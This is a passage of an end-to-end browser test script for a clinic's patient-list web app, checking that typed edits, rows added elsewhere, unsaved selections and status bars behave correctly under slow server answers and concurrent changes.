  assert.ok(l.cut && l.title === l.value, 'a longer one is cut in the cell, and whole in the tooltip: ' + JSON.stringify(l));
  await pb.keyboard.press('Tab');
  await pb.waitForSelector('.save-state[data-state="saved"]', { timeout: 5000 });
  await pb.evaluate(() => document.activeElement?.blur());
});
// (the patient in the row under a point of the window, with the row's number)
const rowAt = (pg, [x, y]) => pg.evaluate(([px, py]) => {
  const tr = document.elementFromPoint(px, py)?.closest('tr');
  return tr ? `${tr.querySelector('td.rownum')?.textContent ?? ''} ${tr.querySelector('.name-text')?.textContent || tr.querySelector('[data-field=patient_name]')?.value || tr.textContent}` : null;
}, [x, y]);
await step('busy day, slow server: a status, group or doctor change whose answer was read before a typed save of the same row (and comes back after it) keeps what was typed, in the cell and in the data, and the next key carries on from it', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  // The change is made at once, and its answer, read then, comes back 2.5 s later (on the live site the answer is a write
  // and four reads); the typed cells save at once.
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__lateReal ||= { updateVisit: d.updateVisit, setVisitStaff: d.setVisitStaff };
    const late = (answer) => new Promise((res) => setTimeout(() => res(answer), 2500));
    d.updateVisit = async (id, changes) => {
      const answer = await window.__lateReal.updateVisit.call(d, id, changes);
      return 'status' in changes || 'doctor_group_id' in changes ? late(answer) : answer;
    };
    d.setVisitStaff = async (...a) => late(await window.__lateReal.setVisitStaff.apply(d, a));
  });
  const rowOf = (name) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
  const cellOf = (name, field) => pb.evaluate(([who, f]) => {
    const tr = [...document.querySelectorAll('table.sheet tbody tr[data-id]')].find((t) => t.querySelector('.name-text')?.textContent === who);
    const el = tr.querySelector(`[data-field="${f}"]`);
    return { value: el.value, cursorIn: el === document.activeElement };
  }, [name, field]);
  const savedOf = (name, field) => pb.evaluate(async ([who, f]) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === who)[f];
  }, [name, field]);
  const untilSaved = async (name, field, want) => {
    for (let i = 0; i < 30 && (await savedOf(name, field)) !== want; i++) await pb.waitForTimeout(200);
    assert.equal(await savedOf(name, field), want, `${name}: ${field} saved`);
  };
  // Treatment Details (it saves as it is typed), typed straight after the change, and the answer comes after its save
  const typeAfter = async (name, change, text) => {
    const details = rowOf(name).locator('input[aria-label^="Treatment details for"]');
    const was = await details.inputValue();
    await change();
    await details.click();
    await pb.keyboard.press('End');
    await pb.keyboard.type(text, { delay: 30 });
    await pb.waitForTimeout(2900); // (the typed save has gone, then the answer comes and the row is drawn again)
    assert.deepEqual(await cellOf(name, 'details_text'), { value: was + text, cursorIn: true }, `${name}: what was typed is still in the cell`);
    await pb.keyboard.type('!');
    await untilSaved(name, 'details_text', `${was}${text}!`);
    await pb.evaluate(() => document.activeElement?.blur());
  };
  await typeAfter('Sample Patient 083', () => rowOf('Sample Patient 083').locator('select[aria-label^="Status for"]').selectOption('in_treatment'), ' U L 016 PC');
  const group = rowOf('Sample Patient 085').locator('select[aria-label^="Doctor group for"]');
  const other = (await group.inputValue()) === '2' ? '1' : '2';
  await typeAfter('Sample Patient 085', () => group.selectOption(other), ' brac 31');
  await typeAfter('Sample Patient 108', async () => {
    await rowOf('Sample Patient 108').locator('.person').first().hover();
    await rowOf('Sample Patient 108').locator('.person .chip-remove').first().click();
  }, ' + ext UR4');
  // Treatment (it saves when the cell is left), typed and left before the answer to a group picked just before
  const g86 = rowOf('Sample Patient 086').locator('select[aria-label^="Doctor group for"]');
  await g86.selectOption((await g86.inputValue()) === '2' ? '1' : '2');
  await rowOf('Sample Patient 086').locator('input[aria-label^="Treatment for"]').click();
  await pb.keyboard.press('Control+A');
  await pb.keyboard.type('Bracket Fix');
  await pb.keyboard.press('Tab');
  await pb.waitForTimeout(2900);
  assert.equal((await cellOf('Sample Patient 086', 'treatment_label')).value, 'Bracket Fix', 'the Treatment cell keeps what was typed');
  await untilSaved('Sample Patient 086', 'treatment_label', 'Bracket Fix');
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    Object.assign(state.data, window.__lateReal);
    document.activeElement?.blur();
  });
});
await step('busy day: a patient another computer adds while someone types in the table waits (a short note says so) and comes in at their place in the order once they are done, not at the end; the list does not scroll by itself', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const scrollTop = () => pb.evaluate(() => document.querySelector('.sheet-wrap').scrollTop);
  await pb.evaluate(() => { document.querySelector('.sheet-wrap').scrollTop = 60; });
  const waiting = await spareWaiting();
  const details = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${waiting[4]}")`) }).locator('input[aria-label^="Treatment details for"]');
  const was = await details.inputValue();
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' U L 016');
  const top = await scrollTop();
  assert.ok(top > 0, 'the list is scrolled a little: ' + top);
  const order = await listOrder();
  const id = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const on = new Set((await state.data.listVisits({ branchId: 1, date: localISO() })).map((v) => v.patient_id));
    const p = (await state.data.searchPatients('98')).find((x) => /^98\d\d$/.test(x.mr_number) && !on.has(x.id));
    const v = await state.data.addVisit({ patient_id: p.id, branch_id: 1, visit_date: localISO(), treatment_label: 'Checkup', status: 'waiting' });
    document.dispatchEvent(new CustomEvent('sheet-reload'));
    return v.id;
  });
  const note = pb.locator('.sheet-new-rows');
  await pb.waitForFunction(() => document.querySelector('.sheet-new-rows').textContent === '1 new row, it appears when you leave the list');
  assert.equal(await note.getAttribute('role'), 'status', 'said quietly to a screen reader too');
  const row = pb.locator(`table.sheet tbody tr[data-id="${id}"]`);
  assert.equal(await row.count(), 0, 'not on the list yet');
  assert.deepEqual(await listOrder(), order, 'no row moved');
  assert.equal(await details.inputValue(), `${was} U L 016`, 'what is typed stays');
  // the person is done: the cursor leaves the table, and a few seconds after the last key the patient comes in among the
  // waiting ones, with the list where it was
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await row.waitFor({ timeout: 15000 });
  const where = await row.evaluate((tr) => ({ last: !tr.nextElementSibling, status: tr.querySelector('select[aria-label^="Status for"]').value,
    next: tr.nextElementSibling?.dataset.kind === 'checkup' ? 'checkup' : tr.nextElementSibling?.querySelector('select[aria-label^="Status for"]').value }));
  assert.ok(!where.last && where.status === 'waiting' && ['waiting', 'checkup'].includes(where.next), 'at their place among the waiting patients: ' + JSON.stringify(where));
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  assert.equal(await note.innerText(), '', 'the note has gone');
  assert.equal(await scrollTop(), top, 'the list did not scroll by itself');
  assert.equal(await details.inputValue(), `${was} U L 016`);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
});
// (another computer puts a demo patient who is not on today's list yet on it, and the list is told; returns the visit's id)
const addElsewhere = () => pb.evaluate(async () => {
  const { state } = await import('/js/state.js');
  const { localISO } = await import('/js/ui/dom.js');
  const d = state.data;
  const on = new Set((await d.listVisits({ branchId: 1, date: localISO() })).map((v) => v.patient_id));
  const p = (await d.searchPatients('98')).find((x) => /^98\d\d$/.test(x.mr_number) && !on.has(x.id));
  const v = await d.addVisit({ patient_id: p.id, branch_id: 1, visit_date: localISO(), treatment_label: 'Checkup', status: 'waiting' });
  document.dispatchEvent(new CustomEvent('sheet-reload'));
  return v.id;
});
// (an Mr# of the demo patients that is not on today's list yet)
const freeMr = () => pb.evaluate(async () => {
  const { state } = await import('/js/state.js');
  const { localISO } = await import('/js/ui/dom.js');
  const on = new Set((await state.data.listVisits({ branchId: 1, date: localISO() })).map((v) => v.patient_id));
  return (await state.data.searchPatients('98')).find((x) => /^98\d\d$/.test(x.mr_number) && !on.has(x.id)).mr_number;
});
await step('busy day: while the cursor rests in a cell, the note counts every new row that waits, through the reloads that come meanwhile ("2 new rows"), and they come in once the cursor leaves the list', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const waiting = await spareWaiting();
  const row = (n) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${n}")`) });
  const treatment = row(waiting[5]).locator('input[aria-label^="Treatment for"]');
  await treatment.click(); // (and nothing typed: the cursor only rests there)
  await pb.waitForTimeout(5300);
  const note = () => pb.locator('.sheet-new-rows').innerText();
  const shown = () => pb.locator('table.sheet tbody tr[data-id]').count();
  const n0 = await shown();
  const first = await addElsewhere();
  await pb.waitForFunction(() => document.querySelector('.sheet-new-rows').textContent === '1 new row, it appears when you leave the list');
  // a reload with no new row (another row's status changed elsewhere, drawn again where it is): the new row still waits,
  // and the note counts the changed row too (it goes to its place with them)
  await elsewhere({ [waiting[7]]: 'in_treatment' });
  await pb.waitForFunction((n) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === n)?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', waiting[7], { timeout: 4000 });
  assert.equal(await note(), '1 new row and 1 row with a new status: they go to their place when you leave the list', 'the note stays while the row waits');
  assert.equal(await shown(), n0, 'not on the list yet');
  // a second patient: two rows wait
  const second = await addElsewhere();
  await pb.waitForFunction(() => document.querySelector('.sheet-new-rows').textContent === '2 new rows and 1 row with a new status: they go to their place when you leave the list', null, { timeout: 4000 });
  assert.equal(await shown(), n0);
  assert.ok(await treatment.evaluate((el) => el === document.activeElement), 'the cursor is still in the cell');
  // the cursor leaves the list: both come in, and the note goes
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.locator(`table.sheet tbody tr[data-id="${second}"]`).waitFor({ timeout: 15000 });
  assert.equal(await pb.locator(`table.sheet tbody tr[data-id="${first}"]`).count(), 1);
  assert.equal(await shown(), n0 + 2);
  assert.equal(await note(), '', 'the note has gone');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: a row another computer changes while the cursor is in it is drawn again where it is at the first reload after the cursor has moved to another row (nothing moves)', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const name = (await spareWaiting())[2];
  const row = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
  await row.locator('input[aria-label^="Treatment for"]').click();
  const order = await listOrder();
  await pb.evaluate(async (who) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === who);
    await state.data.updateVisit(v.id, { status: 'in_treatment', details_text: 'Sample: written by the doctor' });
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  }, name);
  await pb.waitForTimeout(800);
  assert.equal(await row.locator('select[aria-label^="Status for"]').inputValue(), 'waiting', 'not drawn again while the cursor is in it');
  // the cursor goes down to the next row; the next reload (a live update, the 20-second check) draws the row again in place
  await pb.keyboard.press('ArrowDown');
  assert.ok(!(await row.evaluate((tr) => tr.contains(document.activeElement))), 'the cursor is in another row');
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await pb.waitForFunction((who) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === who)?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', name, { timeout: 4000 });
  assert.equal(await row.locator('input[aria-label^="Treatment details for"]').inputValue(), 'Sample: written by the doctor', 'with what the doctor wrote');
  assert.deepEqual(await listOrder(), order, 'drawn again where it was: no row moved');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day, slow server: after an Mr# and Enter the person clicks into a row lower down and types before the add comes back: that row does not move, the new patient waits (the note counts them) and comes in once the cursor leaves the list', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const mr = await freeMr();
  // (the visit is saved at once and its answer arrives 1.5 s later, as on a slow connection)
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realAddVisit ||= d.addVisit;
    window.__addAnswered = 0;
    d.addVisit = async (...a) => { const v = await window.__realAddVisit.apply(d, a); await new Promise((r) => setTimeout(r, 1500)); window.__addAnswered += 1; return v; };
  });
  // a Completed row (below the waiting patients, where the new patient goes)
  const name = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')]
    .filter((t) => t.querySelector('select[aria-label^="Status for"]').value === 'completed').map((t) => t.querySelector('.name-text').textContent)
    .filter((n) => /^Sample Patient \d+$/.test(n) && !['Sample Patient 060', 'Sample Patient 081', 'Sample Patient 099'].includes(n))[10]);
  const row = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
  const details = row.locator('input[aria-label^="Treatment details for"]');
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill(mr);
  await box.press('Enter');
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' U L 018');
  const at = () => row.evaluate((tr) => ({ y: Math.round(tr.getBoundingClientRect().top), n: tr.querySelector('td.rownum').textContent, cursorIn: tr.contains(document.activeElement) }));
  const before = await at();
  await pb.waitForFunction(() => window.__addAnswered > 0, null, { timeout: 10000 });
  await pb.waitForTimeout(300);
  assert.deepEqual(await at(), before, 'the row with the cursor did not move');
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 0, 'the new patient waits');
  assert.equal(await pb.locator('.sheet-new-rows').innerText(), '1 new row, it appears when you leave the list');
  await pb.keyboard.type(' PC');
  assert.match(await details.inputValue(), / U L 018 PC$/, 'what is typed stays');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).waitFor({ timeout: 15000 });
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 1, 'one row for them');
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.addVisit = window.__realAddVisit; document.activeElement?.blur(); });
});
await step('busy day, slow server: a reload that already has the patient just added by Mr# (it read the list after the visit was saved, before the add answered) leaves one row for them, not two', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  const mr = await freeMr();
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realAddVisit ||= d.addVisit;
    window.__addSaved = 0;
    window.__addAnswered = 0;
    d.addVisit = async (...a) => { const v = await window.__realAddVisit.apply(d, a); window.__addSaved += 1; await new Promise((r) => setTimeout(r, 1500)); window.__addAnswered += 1; return v; };
  });
  const all = () => pb.evaluate(() => Number(document.querySelector('.sheet-counts button[data-key=""] strong').textContent));
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill(mr);
  await box.press('Enter');
  await pb.waitForFunction(() => window.__addSaved > 0, null, { timeout: 10000 });
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload'))); // (another computer's change, or the live echo of this one)
  await pb.waitForFunction(() => window.__addAnswered > 0, null, { timeout: 10000 });
  await pb.waitForFunction((m) => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr').textContent.includes(`Mr# ${m}`), mr, { timeout: 5000 });
  await pb.waitForTimeout(300);
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 1, 'one row for them');
  assert.equal(await all(), await pb.locator('table.sheet tbody tr[data-id]').count(), 'the "All" count is the rows shown');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.addVisit = window.__realAddVisit; document.activeElement?.blur(); });
});
await step('busy day, slow server: a reload in the background asked while another day is on its way shows that day, never the old day\'s rows under the new date', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  const name = (await spareWaiting())[3];
  const treatment = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) }).locator('input[aria-label^="Treatment for"]');
  await treatment.click();
  await pb.keyboard.press('End');
  // (the list answers 0.8 s after it is asked for, as on a real connection)
  const yesterday = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const d = state.data;
    window.__realListVisits ||= d.listVisits;
    d.listVisits = async (args) => { const list = await window.__realListVisits.call(d, args); await new Promise((r) => setTimeout(r, 800)); return list; };
    const day = new Date();
    day.setDate(day.getDate() - 1);
    return localISO(day);
  });
  await pb.locator('input[aria-label="Date"]').fill(yesterday);
  await pb.waitForTimeout(300);
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload'))); // (a live update from another computer)
  await pb.waitForTimeout(2000);
  const want = await pb.evaluate(async (day) => (await window.__realListVisits.call((await import('/js/state.js')).state.data, { branchId: 1, date: day })).map((v) => v.id).sort(), yesterday);
  const got = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr[data-id]:not(.is-checkup)')].map((t) => t.dataset.id).sort());
  assert.equal(await pb.locator('input[aria-label="Date"]').inputValue(), yesterday);
  assert.deepEqual(got, want, 'the rows of the day in the date picker');
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: name }).count(), 0, 'none of today\'s rows');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__realListVisits; });
  await pb.getByRole('button', { name: 'Today', exact: true }).click();
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120, null, { timeout: 15000 });
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: while a dialog is open (and while the cursor is in the table after it) a row removed on another computer stays, with no empty line; it goes once the person is done, and at once when nobody is working in the table', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const waiting = await spareWaiting();
  const nameRow = (n) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${n}")`) });
  const removeElsewhere = (names) => pb.evaluate((gone) => import('/js/state.js').then(({ state }) => {
    const d = state.data;
    window.__realListVisits ||= d.listVisits;
    d.listVisits = async (args) => (await window.__realListVisits.call(d, args)).filter((v) => !gone.includes(v.patient.full_name));
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  }), names);
  // the row's dialog is open
  await nameRow(waiting[8]).locator('.name-btn').click();
  await pb.locator(`.modal h2:has-text("${waiting[8]}")`).waitFor();
  const order = await listOrder();
  await removeElsewhere([waiting[3]]);
  await pb.waitForTimeout(1000);
  assert.equal(await nameRow(waiting[3]).count(), 1, 'still on the list while the dialog is open');
  assert.deepEqual(await listOrder(), order, 'no row moved');
  // the dialog closes: the cursor is back on the name, in the table, so it still waits
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await pb.evaluate(() => document.activeElement?.closest('tr')?.querySelector('.name-text')?.textContent), waiting[8]);
  await pb.waitForTimeout(500);
  assert.equal(await nameRow(waiting[3]).count(), 1, 'still on the list with the cursor in the table');
  assert.equal(await pb.locator('tr.gone-row').count(), 0, 'no empty line');
  // the cursor leaves the table: it goes
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await nameRow(waiting[3]).waitFor({ state: 'detached', timeout: 15000 });
  assert.ok(await pb.evaluate(sortedLikeTheSheet));
  // nobody working in the table (more than 5 seconds since the last click in it): the next one goes at once
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForTimeout(5200);
  await removeElsewhere([waiting[3], waiting[5]]);
  await nameRow(waiting[5]).waitFor({ state: 'detached', timeout: 3000 });
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__realListVisits; });
});
await step('busy day: a status or group chosen with the arrow keys and not saved yet is never saved by its row being drawn again or by a reload (nor when the control is taken out of the page); Escape undoes it, Enter saves it', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  // (the answer to a group change comes 1.5 s later)
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realUpdateVisit ||= d.updateVisit;
    d.updateVisit = async (id, changes) => { const answer = await window.__realUpdateVisit.call(d, id, changes); if ('doctor_group_id' in changes) await new Promise((r) => setTimeout(r, 1500)); return answer; };
  });
  const waiting = await spareWaiting();
  const name = waiting[4];
  const row = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
  const status = row.locator('select[aria-label^="Status for"]');
  const group = row.locator('select[aria-label^="Doctor group for"]');
  const savedStatus = () => pb.evaluate(async (n) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === n).status;
  }, name);
  const focused = () => status.evaluate((el) => el === document.activeElement);
  // a group picked with the mouse; before its answer comes, the status is chosen with the arrow keys and not saved
  await group.selectOption((await group.inputValue()) === '2' ? '1' : '2');
  await row.evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; });
  await status.focus();
  await pb.keyboard.press('ArrowDown');
  const preview = await status.inputValue();
  assert.equal(preview, 'in_treatment', 'the next status is shown');
  // the group's answer comes: the row's other cells are drawn new, the status keeps what is shown and the cursor
  await pb.waitForFunction((n) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === n); return tr && !tr.querySelector('td.pp').dataset.before; }, name);
  assert.equal(await status.inputValue(), preview);
  assert.ok(await focused(), 'the cursor is still on the status');
  assert.equal(await savedStatus(), 'waiting', 'not saved by the row being drawn again');
  // a reload in the background, with another row changed on another computer
  await elsewhere({ [waiting[6]]: 'in_treatment' });
  await pb.waitForFunction((n) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === n)?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', waiting[6]);
  await pb.waitForTimeout(500);
  assert.equal(await status.inputValue(), preview);
  assert.ok(await focused());
  assert.equal(await savedStatus(), 'waiting', 'not saved by the reload');
  // Escape undoes it; then Enter saves the one chosen
  await pb.keyboard.press('Escape');
  assert.equal(await status.inputValue(), 'waiting');
  await pb.keyboard.press('ArrowDown');
  await pb.keyboard.press('Enter');
  for (let i = 0; i < 25 && (await savedStatus()) !== 'in_treatment'; i++) await pb.waitForTimeout(200);
  assert.equal(await savedStatus(), 'in_treatment', 'saved with Enter');
  // a control taken out of the page while something not saved is shown in it (Chrome then fires its blur) saves nothing;
  // a real leave does
  const blurs = await pb.evaluate(async () => {
    const { commitOnFinish } = await import('/js/views/staff/common.js');
    const make = () => {
      const s = document.createElement('select');
      for (const v of ['a', 'b']) s.append(new Option(v, v));
      document.body.append(s);
      const saved = [];
      commitOnFinish(s, (v) => saved.push(v));
      s.focus();
      s.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown', bubbles: true }));
      s.value = 'b';
      s.dispatchEvent(new Event('change', { bubbles: true }));
      return [s, saved];
    };
    const [gone, savedGone] = make();
    gone.remove();
    const [left, savedLeft] = make();
    const other = document.createElement('button');
    document.body.append(other);
    other.focus();
    await new Promise((r) => setTimeout(r, 50));
    left.remove(); other.remove();
    return { removed: savedGone, left: savedLeft };
  });
  assert.deepEqual(blurs, { removed: [], left: ['b'] });
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__realUpdateVisit; document.activeElement?.blur(); });
});
await step('round 5: a checkup patient\'s Group cell shows a dash, read out as "Checkup patients have no group"', async () => {
  const cells = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr.is-checkup')].map((tr) => {
    const c = tr.children[[...document.querySelectorAll('table.sheet thead th:not([hidden])')].findIndex((th) => th.textContent.replace('▾', '').trim() === 'Group')];
    const dash = c.querySelector('.no-group');
    return { shown: dash?.querySelector('[aria-hidden="true"]')?.textContent, title: dash?.title, read: c.querySelector('.sr-only')?.textContent, select: !!c.querySelector('select') };
  }));
  assert.ok(cells.length >= 1, 'checkup rows: ' + cells.length);
  for (const c of cells) assert.deepEqual(c, { shown: '—', title: 'Checkup patients have no group', read: 'Checkup patients have no group', select: false });
});
await step('round 5: the Group drop-down offers the groups of Clinic setup; a group the Google Sheet names that Clinic setup does not have ("Group 4") is shown greyed, "Add this group in Clinic setup", and "No group" next to it saves nothing', async () => {
  const sel = pb.locator('table.sheet tbody tr', { has: pb.locator('.name-text:text-is("Sample Patient 099")') }).locator('select[aria-label^="Doctor group for"]');
  const look = () => sel.evaluate((s) => ({ shown: s.selectedOptions[0].textContent, disabled: s.selectedOptions[0].disabled, unknown: s.classList.contains('group-unknown'), grey: s.classList.contains('gs-grey'),
    title: s.title, style: getComputedStyle(s).fontStyle }));
  assert.deepEqual(await look(), { shown: 'Group 4', disabled: true, unknown: true, grey: true, title: 'Add this group in Clinic setup', style: 'italic' });
  const setup = await pb.evaluate(async () => { const { state } = await import('/js/state.js'); return state.ref.groups.map((g) => g.name); });
  assert.deepEqual(await sel.evaluate((s) => [...s.options].map((o) => o.textContent)), ['Group 4', 'No group', ...setup]);
  const other = await pb.locator('table.sheet tbody tr:not(.is-checkup) select[aria-label^="Doctor group for"]').first().evaluate((s) => [...s.options].map((o) => o.textContent));
  assert.deepEqual(other, ['No group', ...setup], 'the other rows: No group and the groups of Clinic setup');
  // the arrow keys show "No group"; Escape brings the sheet's words back; leaving saves nothing
  await sel.focus();
  await pb.keyboard.press('ArrowDown');
  assert.deepEqual(await look(), { shown: 'No group', disabled: false, unknown: false, grey: true, title: '', style: 'normal' });
  await pb.keyboard.press('Escape');
  assert.equal((await look()).shown, 'Group 4');
  await pb.keyboard.press('ArrowDown');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.waitForTimeout(300);
  const saved = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === 'Sample Patient 099');
    return [v.doctor_group_id, v.sheet_cells?.group?.t];
  });
  assert.deepEqual(saved, [null, 'Group 4'], 'nothing saved');
  await shot(pb, '24-sheet-group-unknown');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day at 1366x768: the bars that come and go (the Undo of a removed doctor, a warning, the changes not saved) are on the line of the counts and never move the list, nor cover it or the save status; a second click where a doctor was removed takes nobody from another patient; the Undo stays while the cursor is in the list; the changes not saved are one line, with Show opening over the list', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  const wrapTop = () => pb.locator('.sheet-wrap').evaluate((w) => Math.round(w.getBoundingClientRect().top));
  const onLine = (bar) => bar.evaluate((el) => {
    const b = el.getBoundingClientRect();
    const line = document.querySelector('.sheet-subhead').getBoundingClientRect();
    const w = document.querySelector('.sheet-wrap').getBoundingClientRect();
    const s = document.querySelector('.save-status').getBoundingClientRect();
    const c = document.querySelector('.sheet-counts').getBoundingClientRect();
    const hits = (r) => !(b.right <= r.left || b.left >= r.right || b.bottom <= r.top || b.top >= r.bottom);
    return { onCountsLine: b.top >= line.top - 0.5 && b.bottom <= line.bottom + 0.5, aboveList: b.bottom <= w.top + 0.5, coversSave: hits(s), coversCounts: hits(c) };
  });
  const onLineOk = { onCountsLine: true, aboveList: true, coversSave: false, coversCounts: false };
  const people = () => pb.evaluate(() => Object.fromEntries([...document.querySelectorAll('table.sheet tbody tr[data-id]')].map((tr) => [tr.dataset.id, [...tr.querySelectorAll('.person')].map((p) => p.title).join(', ')])));
  const top0 = await wrapTop();
  const line0 = await pb.locator('.sheet-subhead').evaluate((el) => Math.round(el.getBoundingClientRect().height));
  // a doctor chip's × (Sample Patient 081 has a doctor): the Undo bar comes on the line of the counts, and the list stays put
  const r81 = pb.locator('table.sheet tbody tr', { has: pb.locator('.name-text:text-is("Sample Patient 081")') });
  const id81 = await r81.getAttribute('data-id');
  await r81.locator('.person').first().hover();
  const x = await r81.locator('.person .chip-remove').first().boundingBox();
  const at = { x: x.x + x.width / 2, y: x.y + x.height / 2 };
  const before = await people();
  await pb.mouse.click(at.x, at.y);
  const undoBar = pb.locator('.sheet-bars .alert-info', { hasText: 'removed from Sample Patient 081.' });
  await undoBar.waitFor();
  assert.deepEqual(await onLine(undoBar), onLineOk, 'the Undo bar');
  assert.equal(await wrapTop(), top0, 'the list did not move');
  assert.equal(await pb.locator('.sheet-subhead').evaluate((el) => Math.round(el.getBoundingClientRect().height)), line0, 'the line of the counts is as tall as before');
  assert.equal(await pb.evaluate(({ x, y }) => document.elementFromPoint(x, y)?.closest('tr')?.dataset.id, at), id81, 'the same patient\'s row is under the mouse');
  // a second click at the same place (a double click, or going for the next chip) takes nobody from another patient
  await pb.waitForTimeout(80);
  await pb.mouse.click(at.x, at.y);
  await pb.waitForTimeout(500);
  const after = await people();
  assert.deepEqual(Object.keys(before).filter((id) => id !== id81 && before[id] !== after[id]), [], 'no other patient lost a doctor');
  await undoBar.getByRole('button', { name: 'Undo' }).click();
  await undoBar.waitFor({ state: 'hidden' });
